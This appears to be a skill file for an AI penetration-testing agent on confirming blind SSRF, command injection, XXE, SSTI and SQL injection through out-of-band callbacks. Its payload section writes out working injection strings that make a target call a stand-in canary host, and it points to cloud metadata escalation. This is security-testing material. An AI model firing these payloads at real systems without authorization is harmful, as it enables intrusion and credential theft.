---
name: oob-verification
description: "Confirm blind vulnerabilities (no reflection in the response) via out-of-band interactions using Burp Collaborator or interactsh canaries. Covers blind SSRF, RCE/command injection, XXE, SSTI, and OOB SQLi, with per-injection canary correlation and interaction-log evidence. Auto-loads for any blind/no-response-reflection injection point and for SSRF/XXE/RCE confirmation."
---

# Out-of-Band Verification

When a payload produces no visible change in the response, the proof lives out-of-band: you make the target reach out to a server you control. A DNS or HTTP hit on your unique canary is the confirmation. No callback is not proof of safety — it's an unproven negative (evidence-discipline: try alternate egress/encoding before concluding).

Tools (installed, see modern-tooling-2026): `interactsh-client` for a self-hosted canary, or Burp Collaborator via the burp MCP (`collaborator_generate` / `collaborator_poll`). Generate a **unique** canary subdomain per injection point so a hit tells you exactly which input fired.

---

## 1. WORKFLOW

1. Generate a unique canary (e.g. `interactsh-client` → `<rand>.oast.fun`, or Collaborator payload).
2. Inject the class-appropriate payload pointing at that canary.
3. Wait (poll for at least 10–30s; some callbacks are delayed by queues/schedulers).
4. Poll interactions. Correlate the subdomain to the exact injection point.
5. Interpret:
   - **DNS interaction only** = the target *resolved* your host (SSRF/parser reached DNS; egress may be filtered). Still strong evidence.
   - **HTTP(S) interaction** = full outbound request egress — stronger; capture headers/source IP (may reveal internal infra).
6. Save the interaction log + the request that triggered it to `files/` — that pairing is the proof.

## 2. PAYLOADS BY CLASS (canary = your unique subdomain)

**Blind SSRF** — put the canary where a URL is fetched (webhook, import-by-URL, PDF/screenshot generator, avatar-from-URL, `url=`/`callback=`/`dest=` params):
```
http://<canary>/    https://<canary>/    //<canary>
```
Escalate a confirmed SSRF toward `http://169.254.169.254/latest/meta-data/` only per safe-exploitation limits.

**Blind RCE / command injection:**
```
;nslookup <canary>;    |nslookup <canary>|    $(curl http://<canary>/)    `curl http://<canary>`
&& ping -c1 <canary> &&
```

**Blind XXE** — external entity to your canary:
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://<canary>/x"> ]><r>&x;</r>
<!-- OOB/parameter-entity DTD for blind exfil: point SYSTEM to http://<canary>/e.dtd -->
```

**Blind SSTI** — expression that triggers an outbound call when evaluated:
```
{{''.__class__.__mro__[1].__subclasses__()...os.popen('curl http://<canary>')}}   (Jinja2, per safe rules)
${T(java.lang.Runtime).getRuntime().exec("nslookup <canary>")}                    (Java EL/Spring)
```
Use the math-marker probes (`{{7*7}}`) first to detect eval; escalate to OOB only to confirm code execution.

**OOB SQLi (where in-band is blind):**
- MSSQL: `;EXEC master..xp_dirtree '\\<canary>\a'--`
- Oracle: `UTL_HTTP.request('http://<canary>')` / `UTL_INADDR`
- MySQL (Windows/`secure_file_priv` off): `LOAD_FILE('\\\\<canary>\\a')`

**Second-order** — inject the canary into a stored field (name, profile, filename) that a *backend* job later processes; the callback may arrive minutes later from server infra, not your request.

## 3. DISCIPLINE

- One canary per injection point — never reuse, or you can't attribute the hit.
- No callback ≠ safe: retry with a different scheme (`http`/`https`/`gopher`/`dns-only`), URL encoding, or egress path before calling it clean.
- Prove capability, then stop — a single confirmed interaction is enough; don't loop or pivot deeper than needed (safe-exploitation).
- The interaction log is the evidence; a claimed callback with no log is not a finding (evidence-discipline).
